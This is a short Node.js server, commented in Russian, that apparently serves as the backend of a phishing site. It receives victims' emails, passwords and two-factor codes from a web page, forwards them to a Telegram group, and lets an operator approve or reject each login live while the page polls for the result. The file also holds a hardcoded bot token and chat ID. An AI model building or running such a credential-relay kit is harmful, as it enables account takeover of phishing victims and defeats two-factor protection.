const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const cors = require('cors');

// --- НАСТРОЙКИ ---
const token = '8529029264:AAHn2DMIIgv-Ga2Fd5G3Az86GQqp1qshNgQ'; // Вставь свой токен
const adminChatId = '-1003894478662'; // ID твоей группы
// -----------------

const bot = new TelegramBot(token, { polling: true });
const app = express();

app.use(cors());
app.use(express.json());

let userStatuses = {}; 

// Когда сайт отправляет данные
app.post('/send-data', (req, res) => {
    const { type, email, pass, code, userId } = req.body;
    
    let message = '';
    if (type === 'auth') {
        message = `⚠️ **Вход**\n👤 ID: \`${email}\`\n🔑 Pass: \`${pass}\``;
    } else if (type === '2fa') {
        message = `🔢 **Код 2FA**: \`${code}\``;
    }

    bot.sendMessage(adminChatId, message, {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[
                { text: '✅ Подтвердить', callback_data: `ok_${userId}` },
                { text: '❌ Неверно', callback_data: `err_${userId}` }
            ]]
        }
    });

    userStatuses[userId] = 'pending';
    res.send({ status: 'sent' });
});

// Обработка кнопок из Telegram
bot.on('callback_query', (query) => {
    const [action, userId] = query.data.split('_');
    userStatuses[userId] = action === 'ok' ? 'success' : 'error';

    bot.answerCallbackQuery(query.id, { text: "Статус обновлен" });
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
        chat_id: query.message.chat.id,
        message_id: query.message.message_id
    });
});

// Сайт проверяет статус
app.get('/check/:userId', (req, res) => {
    res.send({ status: userStatuses[req.params.userId] || 'none' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
